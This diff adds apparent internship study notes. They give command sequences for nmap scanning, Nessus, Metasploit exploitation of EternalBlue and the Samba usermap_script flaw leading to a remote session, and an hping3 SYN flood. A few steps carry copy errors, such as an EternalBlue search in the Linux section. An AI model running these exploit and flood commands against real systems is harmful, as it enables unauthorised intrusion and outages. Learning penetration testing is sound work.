@@ -1,0 +1,65 @@
+
+Dlithe Cyber Security Internship
+
+I will be posting all the commands that I have used in my internsip training.
+
+
+Port Scanning using nmap:
+
+$ ping <ip_addresss> (to make sure that we can reach a machine/device)
+
+$ nmap -A -T4 <ip_address> (nmap is a port scanner)
+
+
+Vulnerabilty Scanning using nessus:
+
+$ systemctl start nessusd (start nessus daemon)
+
+
+Exploitation:
+
+$ sudo msfdb init (Initialize metasploit)
+
+$ sudo service postgresql start (starting Postgresql database service)
+
+$ msfconsole (opening metasplot console)
+
+msf6> search eternalblue (use Vulnerability name for searching the exploit)
+
+msf6> use exploit/windows/smb/ms17_010_eternalblue (selcet the exploit)
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <ip_address> (Insert the required details of exploits like RHOSTS with victim's IP address)
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit (Start attack)
+
+meterpreter> help (if the attack is successfull, it will show meterpreter)
+
+
+Exploiting Linux/GNU Machine Using Metasploit
+
+$ sudo msfdb init (Initialize metasploit)
+
+$ sudo service postgresql start (starting Postgresql database service)
+
+$ msfconsole (opening metasplot console)
+
+msf6> search eternalblue (use Vulnerability name for searching the exploit)
+
+msf6> use exploit/multi/samba/usermap_script (select the exploit)
+
+Set the required options like RHOSTS, to initiate the attack
+
+msf6 exploit(multi/samba/usermap_script) > set RHOST <ip_address> (Insert the required details of exploits like RHOSTS with victim's IP address)
+
+msf6 exploit(multi/samba/usermap_script) > exploit (Start attack)
+
+sessions -i
+
+After getting the control of victim's Machine, We can access any file that belongs to the victim machine (Linux/GNU).
+
+
+Denial of Service(DOS) Attack : 
+
+$ hping3 -S -p <port> <ip_address> (Before starting a dos attack, we first perform a port scan to check if a port is open. -S option is a SYN flag that implies the attacker will not wait for ACK)
+
+$ hping3 -S -p <port> <ip_address> -flood (the -flood option floods the victim machine with packets without waiting for acknowledgement/ACK)
